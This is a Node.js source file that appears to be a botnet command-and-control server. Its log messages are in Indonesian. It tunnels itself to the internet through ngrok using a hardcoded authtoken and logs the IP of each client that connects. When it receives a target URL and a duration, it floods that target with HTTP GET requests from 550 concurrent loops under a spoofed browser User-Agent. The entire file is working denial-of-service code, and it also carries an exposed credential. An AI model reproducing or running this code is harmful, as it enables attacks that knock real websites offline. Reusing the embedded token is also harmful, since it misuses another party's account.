const express = require("express");
const ngrok = require("ngrok");
const https = require("https");
const bodyParser = require("body-parser");

const app = express();
const port = Math.floor(Math.random() * (60000 - 3000) + 3000);

app.use(bodyParser.json());

let connectedClients = [];

app.post("/connect", (req, res) => {
  const ip = req.ip || req.headers["x-forwarded-for"] || "Unknown IP";
  connectedClients.push(ip);
  console.log(`[C2] TERHUBUNG DARI CLIENT: ${ip}`);
  res.json({ status: "connected" });
});

app.post("/set", (req, res) => {
  const { target, time } = req.body;
  console.log(`[C2] TARGET: ${target}`);
  console.log(`[C2] DURASI: ${time}`);
  res.json({ status: "received" });

  const parsedUrl = new URL(target);
  const headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "*/*",
    "Connection": "keep-alive"
  };

  const options = {
    hostname: parsedUrl.hostname,
    path: parsedUrl.pathname + parsedUrl.search,
    method: "GET",
    headers: headers
  };

  const end = Date.now() + parseInt(time) * 1000;
  function send() {
    if (Date.now() > end) return;
    const req = https.request(options, () => {});
    req.on("error", () => {});
    req.end();
    setImmediate(send);
  }

  for (let i = 0; i < 550; i++) send();
});

(async () => {
  app.listen(port, async () => {
    console.log(`[C2] SERVER RUNNING ON PORT ${port}`);
    await ngrok.authtoken("2xclrXeyimoudAtLmDQu7DibbSJ_42dYjd7bccEoCS23svLnA");
    const url = await ngrok.connect(port);
    console.log(`[C2] API C2NYA: ${url}`);
    console.log(`[C2] MENUNGGU CLIENT UNTUK TERHUBUNG...`);
  });
})();
